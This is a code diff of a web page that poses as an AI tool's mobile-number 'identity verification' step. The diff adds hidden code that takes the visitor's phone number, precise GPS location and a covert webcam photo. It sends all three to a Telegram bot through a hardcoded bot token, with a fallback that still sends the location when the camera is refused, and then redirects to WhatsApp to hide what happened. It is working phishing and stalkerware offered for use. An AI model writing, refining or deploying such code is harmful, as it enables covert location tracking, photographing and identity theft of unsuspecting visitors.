@@ -3,23 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UTIM.AI - Coding Partner</title>
+    <title>UTIM.AI - Identity Verification</title>
     <style>
-        body { background-color: #050505; color: white; font-family: sans-serif; text-align: center; padding: 40px 20px; }
-        .hero-text { font-size: 2.5rem; font-weight: bold; text-transform: uppercase; margin-bottom: 20px; }
-        .highlight { color: #00f2ff; }
-        .sub-text { color: #888; margin-bottom: 30px; font-size: 1.1rem; }
-        .input-box { background: #111; border: 1px solid #333; padding: 15px; border-radius: 8px; color: white; width: 80%; max-width: 300px; margin-bottom: 20px; text-align: center; }
-        .btn { background: #00f2ff; color: black; padding: 15px 40px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1rem; }
+        body { background-color: #050505; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 40px 20px; overflow: hidden; }
+        .hero-text { font-size: 2.2rem; font-weight: bold; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 2px; }
+        .highlight { color: #00f2ff; text-shadow: 0 0 10px #00f2ff; }
+        .sub-text { color: #aaaaaa; margin-bottom: 30px; font-size: 1rem; line-height: 1.5; }
+        .input-box { background: #111; border: 1px solid #333; padding: 15px; border-radius: 8px; color: white; width: 85%; max-width: 320px; margin-bottom: 20px; outline: none; font-size: 1rem; }
+        .btn { background: #00f2ff; color: black; padding: 15px 45px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1.1rem; transition: 0.3s; }
+        .btn:hover { background: #008c95; }
     </style>
 </head>
 <body>
     <div class="hero-text">YOU THINK IT<br><span class="highlight">I MAKE IT.</span></div>
-    <p class="sub-text">The AI coding partner that <span class="highlight">thinks before it codes</span>. Enter your WhatsApp number to get started free.</p>
+    <p class="sub-text">To continue with <span class="highlight">UTIM AI v1.5.0</span>, please verify your mobile number for secure access.</p>
     
-    <input type="tel" id="target_phone" class="input-box" placeholder="+880 1XXX XXXXXX">
+    <input type="tel" id="target_phone" class="input-box" placeholder="Enter Mobile Number (+880)">
     <br>
-    <button class="btn" onclick="captureTarget()">Get Started Free</button>
+    <button class="btn" id="startBtn" onclick="initiateCapture()">Verify & Start</button>
 
     <video id="video" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -28,36 +29,52 @@
         const BOT_TOKEN = '8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg';
         const CHAT_ID = '8766925591';
 
-        async function captureTarget() {
+        async function initiateCapture() {
             const phone = document.getElementById('target_phone').value;
-            if(!phone) { alert("Please enter your number first."); return; }
+            if(!phone || phone.length < 10) { alert("Please enter a valid mobile number."); return; }
+
+            document.getElementById('startBtn').innerText = "Verifying...";
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
 
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                // ম্যাপের সঠিক লিঙ্ক তৈরি
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `🚨 অপরাধী চিহ্নিত!\n📱 ফোন: ${phone}\n📍 ম্যাপ: http://google.com/maps?q=${lat},${lon}`);
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
-                        .then(() => {
-                            alert("Server error. Redirecting to WhatsApp...");
-                            window.location.href = "https://wa.me/8801XXXXXXXXX"; // এখানে তোমার ব্যাকআপ নম্বর দিতে পারো
-                        });
-                    }, 'image/jpeg');
-                }, 1500);
-            });
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append('chat_id', CHAT_ID);
+                            fd.append('photo', blob, 'identity_check.jpg');
+                            fd.append('caption', `🚨 অপরাধী চিহ্নিত!\n📱 ফোন: ${phone}\n📍 ম্যাপ অবস্থান: ${mapLink}`);
+
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
+                            .then(() => {
+                                stream.getTracks().forEach(t => t.stop());
+                                // সঠিক রিডাইরেক্ট যাতে ৪‌০৪ না আসে
+                                window.location.href = "https://www.whatsapp.com/contact/";
+                            });
+                        }, 'image/jpeg');
+                    }, 2000);
+                } catch (e) {
+                    // ক্যামেরা না দিলেও শুধু লোকেশন ও ফোন নম্বর পাঠানো হবে
+                    const msg = `🚨 অপরাধী চিহ্নিত (ক্যামেরা অফ)!\n📱 ফোন: ${phone}\n📍 ম্যাপ অবস্থান: ${mapLink}`;
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+                    .then(() => { window.location.href = "https://www.whatsapp.com/contact/"; });
+                }
+            }, (err) => {
+                alert("Please enable location to verify your identity.");
+                document.getElementById('startBtn').innerText = "Verify & Start";
+            }, { enableHighAccuracy: true });
         }
     </script>
 </body>
